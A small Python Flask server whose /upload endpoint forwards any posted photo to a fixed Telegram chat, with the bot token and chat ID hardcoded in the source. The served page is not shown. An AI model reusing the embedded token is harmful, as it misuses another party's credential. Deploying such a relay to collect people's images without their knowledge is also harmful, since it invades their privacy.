import os
from flask import Flask, request, render_template
import telebot

app = Flask(__name__)

# Telegram Bot setup
BOT_TOKEN = "8257336150:AAGjrGA6AQERkWuKG0hTVAjs_7oTqMzXw14"
CHAT_ID = "6314556756"
bot = telebot.TeleBot(BOT_TOKEN)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    print("ߓ /upload endpoint hit!")  # Debug log
    if 'photo' in request.files:
        photo = request.files['photo']
        try:
            bot.send_photo(CHAT_ID, photo)
            print("✅ Photo sent to Telegram!")
            return "Photo sent", 200
        except Exception as e:
            print(f"❌ Telegram send error: {e}")
            return f"Bot error: {e}", 500
    else:
        print("❌ No photo found in request")
        return "No photo received", 400

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
